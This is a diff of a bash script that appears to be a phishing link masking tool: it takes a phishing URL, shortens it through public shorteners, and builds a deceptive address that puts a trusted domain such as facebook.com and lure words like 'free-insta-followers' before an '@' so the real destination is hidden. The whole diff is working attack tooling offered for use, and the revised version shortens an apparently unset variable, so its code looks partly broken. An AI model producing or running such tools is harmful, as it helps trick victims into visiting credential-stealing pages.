@@ -34,17 +34,26 @@ echo ""
 echo -n " Paste Phishing URL here (with http or https): "
 read phish
 url_checker $phish
-short=$(curl -s https://da.gd/s/?url=${phish})
-shorter=${short#https://}
-echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
-echo -e 'Domain to mask the Phishing URL \e[91m(Ex:\e[96m https://google.com , http://anything.org)\e[0m :'
-echo -en "\e[32m=>\e[0m "
-read mask
-url_checker $mask
-echo -e '\nType social engineering words \e[91m(Ex:\e[96m like, free-money, best-pubg-tricks)'
-echo -e "\e[93mDon't use space just use '-' between social engineering words\e[0m"
-echo -en "\e[32m=>\e[0m "
-read words
-echo -e "\n\e[95mGenerating Masking Online Hacking Link...\e[0m\n"
-final=$mask-$words@$shorter
-echo -e "Here is the Masking OH URL:\e[32m ${final} \e[0m\n"
+#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${phish})
+	#short=$(curl -s https://vurl.com/api.php?url=${phish})
+	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
+        #checking for is.gd is working or not.
+        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
+        shorter=${derek#https://}
+        else
+        #short=$(curl -s https://soo.gd/api.php?url=${link})
+        curl -s https://api.shrtco.de/v2/shorten?url=${link} >> log.URI 
+        grep -o 'https:[^"]*' log.URI >> bURI
+        rm log.URI
+        sed 's/\\//g' bURI >> uri.log
+        rm bURI
+        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
+        shorter=${short#https://}
+        fi
+        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
+        url_checker $mask
+	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
+	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"
+        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+        final_url=$mask-$words@$shorter
+	printf "$final_url\n"
